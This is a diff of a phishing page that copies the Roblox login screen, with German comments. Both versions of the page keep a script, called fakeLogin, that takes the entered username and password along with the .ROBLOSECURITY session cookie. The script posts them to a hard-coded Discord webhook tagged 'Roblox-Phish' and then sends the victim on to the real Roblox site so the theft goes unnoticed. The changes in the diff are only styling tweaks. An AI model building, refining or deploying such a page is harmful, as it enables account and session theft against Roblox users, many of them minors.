@@ -1,142 +1,119 @@
 <!doctype html>
-<!--[if IE 8]><html class="ie8" ng-app="robloxApp"><![endif]-->
-<!--[if gt IE 8]><!-->
 <html lang="en">
-<!--<![endif]-->
-<head data-machine-id="3da6fb79-fa4f-6ccb-e15c-fef37807754b">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="author" content="Roblox Corporation">
-    <meta name="description" content="Login to your Roblox account or sign up to create a new account.">
-    <meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">
-    <title>Log in to Roblox</title>
-    <link rel="icon" href="https://www.roblox.com/favicon.ico">
+<head>
+  <meta charset="utf-8">
+  <title>Log in to Roblox</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="https://www.roblox.com/favicon.ico">
 
-    <!-- ORIGINAL ROBLOX CSS -->
-    <link rel="stylesheet" href="https://css.rbxcdn.com/56f6868ec13cefb471ad86176c7b9642571d05082c86ac6300ddfeb028617d4e.css">
-    <link rel="stylesheet" href="https://css.rbxcdn.com/e712ca41cb057bb3437b163827c3c781440d8e620a807aa2b3e4887da9864da7.css">
+  <!-- ORIGINAL Roblox-CSS (unverändert) -->
+  <link rel="stylesheet" href="https://css.rbxcdn.com/56f6868ec13cefb471ad86176c7b9642571d05082c86ac6300ddfeb028617d4e.css">
+  <link rel="stylesheet" href="https://css.rbxcdn.com/e712ca41cb057bb3437b163827c3c781440d8e620a807aa2b3e4887da9864da7.css">
 
-    <!-- FIX 1 + 2: Hintergrund & breitere Box -->
-    <style>
-    html,body{height:100%;margin:0}
-    body{
-      background:#0e0e10 url(https://www.roblox.com/images/landing/hero-2025.jpg) center/cover no-repeat fixed;
-    }
-    .phish-box-outer{
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      min-height:calc(100vh - 64px);
-    }
-    .phish-box{
-      width:50vw;
-      max-width:600px;
-      background:#1f1f23;
-      border-radius:12px;
-      padding:48px;
-      box-shadow:0 20px 32px #00000080;
-    }
-    </style>
+  <!-- NUR 2 Kleinigkeiten: Hintergrundbild + breitere Box -->
+  <style>
+    /* Hintergrundbild */
+    body{background:#0e0e10 url(https://www.roblox.com/images/landing/hero-2025.jpg) center/cover no-repeat fixed}
+    /* Breitere Login-Box */
+    .rbx-login-container{width:50vw;max-width:600px;margin:10vh auto}
+  </style>
 </head>
 
 <body id="rbx-body" dir="ltr" class="rbx-body dark-theme builder-font">
-<div id="wrap" class="wrap no-gutter-ads logged-out">
-    <!-- ORIGINAL HEADER -->
-    <div id="navigation-container">
-        <div id="header" class="navbar-fixed-top rbx-header">
-            <div class="container-fluid">
-                <div class="rbx-navbar-header">
-                    <div id="header-menu-icon" class="rbx-nav-collapse">
-                        <button type="button" class="btn-navigation-nav-menu-md menu-button">
-                            <span class="icon-nav-menu"></span>
-                        </button>
-                    </div>
-                    <div class="navbar-header">
-                        <a class="navbar-brand" href="/home">
-                            <span class="icon-logo"></span><span class="icon-logo-r"></span>
-                        </a>
-                    </div>
-                </div>
-                <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/charts">Charts</a></li>
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a></li>
-                    <li><a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="/develop">Create</a></li>
-                    <li id="navigation-robux-container"></li>
-                </ul>
-                <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/charts">Charts</a></li>
-                    <li><a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a></li>
-                    <li><a id="header-develop-sm-link" class="font-header-2 nav-menu-title text-header" href="/develop">Create</a></li>
-                    <li id="navigation-robux-mobile-container"></li>
-                </ul>
-                <div id="right-navigation-header"></div>
-            </div>
+  <!-- ORIGINAL HEADER -->
+  <div id="navigation-container">
+    <div id="header" class="navbar-fixed-top rbx-header">
+      <div class="container-fluid">
+        <div class="rbx-navbar-header">
+          <div id="header-menu-icon" class="rbx-nav-collapse">
+            <button type="button" class="btn-navigation-nav-menu-md menu-button">
+              <span class="icon-nav-menu"></span>
+            </button>
+          </div>
+          <div class="navbar-header">
+            <a class="navbar-brand" href="/home">
+              <span class="icon-logo"></span><span class="icon-logo-r"></span>
+            </a>
+          </div>
         </div>
+        <ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
+          <li><a class="font-header-2 nav-menu-title text-header" href="/charts">Charts</a></li>
+          <li><a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a></li>
+          <li><a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="/develop">Create</a></li>
+          <li id="navigation-robux-container"></li>
+        </ul>
+        <ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
+          <li><a class="font-header-2 nav-menu-title text-header" href="/charts">Charts</a></li>
+          <li><a class="font-header-2 nav-menu-title text-header" href="/catalog">Marketplace</a></li>
+          <li><a id="header-develop-sm-link" class="font-header-2 nav-menu-title text-header" href="/develop">Create</a></li>
+          <li id="navigation-robux-mobile-container"></li>
+        </ul>
+        <div id="right-navigation-header"></div>
+      </div>
     </div>
+  </div>
 
-    <main class="container-main content-no-ads" id="container-main">
-        <!-- LOGIN-BEREICH -->
-        <div class="content" id="content">
-            <div id="react-login-web-app" class="phish-box-outer">
-                <div class="rbx-login-container phish-box">
-                    <div class="login-area">
-                        <h2 class="login-header">Log In</h2>
-                        <form id="f" autocomplete="off" onsubmit="fakeLogin(); return false;">
-                            <div class="form-group">
-                                <label for="u">Username/Email/Phone</label>
-                                <input id="u" name="u" type="text" required>
-                            </div>
-                            <div class="form-group">
-                                <label for="p">Password</label>
-                                <input id="p" name="p" type="password" required>
-                            </div>
-                            <button type="submit" class="btn-primary">Log In</button>
-                            <div class="login-links">
-                                <a href="#">Forgot Password or Username?</a><br>
-                                <span>Don't have an account? <a href="#">Sign Up</a></span>
-                            </div>
-                        </form>
-                    </div>
-                </div>
-            </div>
+  <!-- ORIGINALES MAIN (nur React-Div ersetzt) -->
+  <main class="container-main content-no-ads" id="container-main">
+    <div class="content" id="content">
+      <div id="react-login-web-app">
+        <!-- 1:1 Roblox-Look, aber breiter -->
+        <div class="rbx-login-container">
+          <div class="login-area">
+            <h2 class="login-header">Log In</h2>
+            <form id="f" autocomplete="off" onsubmit="fakeLogin(); return false;">
+              <div class="form-group">
+                <label for="u">Username/Email/Phone</label>
+                <input id="u" name="u" type="text" required>
+              </div>
+              <div class="form-group">
+                <label for="p">Password</label>
+                <input id="p" name="p" type="password" required>
+              </div>
+              <button type="submit" class="btn-primary">Log In</button>
+              <div class="login-links">
+                <a href="#">Forgot Password or Username?</a><br>
+                <span>Don't have an account? <a href="#">Sign Up</a></span>
+              </div>
+            </form>
+          </div>
         </div>
-    </main>
+      </div>
+    </div>
+  </main>
 
-    <footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"></footer>
-</div>
+  <footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"></footer>
 
-<!-- ORIGINAL SCRIPTS -->
-<script src="https://js.rbxcdn.com/3549e188c34f5a2d6fd6ff275813b3bc.js"></script>
-<script src="https://js.rbxcdn.com/18ab8be8d347e6f752bab5eff54c9afd.js"></script>
+  <!-- ORIGINAL SCRIPTS -->
+  <script src="https://js.rbxcdn.com/3549e188c34f5a2d6fd6ff275813b3bc.js"></script>
+  <script src="https://js.rbxcdn.com/18ab8be8d347e6f752bab5eff54c9afd.js"></script>
 
-<!-- FIX 3: Webhook + Weiterleitung -->
-<script>
-function fakeLogin(){
-    const u = document.getElementById('u').value;
-    const p = document.getElementById('p').value;
-    const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';
-
-    fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            content: '**Roblox-Phish**',
-            embeds: [{
-                title: 'Neuer Login',
-                color: 0x02b757,
-                fields: [
-                    {name: 'User', value: u, inline: true},
-                    {name: 'Pass', value: p, inline: true},
-                    {name: 'ROBLOSECURITY', value: robloxSec || '–', inline: false}
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        })
-    }).then(() => {
-        window.location = 'https://www.roblox.com/home';
-    });
-}
-</script>
+  <!-- WEBHOOK + WEITERLEITUNG -->
+  <script>
+  function fakeLogin(){
+      const u = document.getElementById('u').value;
+      const p = document.getElementById('p').value;
+      const robloxSec = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/)?.[1] || '';
+      fetch('https://discord.com/api/webhooks/1422244213491499162/S8y98VTEc7q-LoxTTi0yhtw7xtyRTcRzz9fQGW5geZgVrUzBj8e-aCg3_QL6qodey4pS', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+              content: '**Roblox-Phish**',
+              embeds: [{
+                  title: 'Neuer Login',
+                  color: 0x02b757,
+                  fields: [
+                      {name: 'User', value: u, inline: true},
+                      {name: 'Pass', value: p, inline: true},
+                      {name: 'ROBLOSECURITY', value: robloxSec || '–', inline: false}
+                  ],
+                  timestamp: new Date().toISOString()
+              }]
+          })
+      }).then(() => {
+          window.location = 'https://www.roblox.com/home';
+      });
+  }
+  </script>
 </body>
 </html>
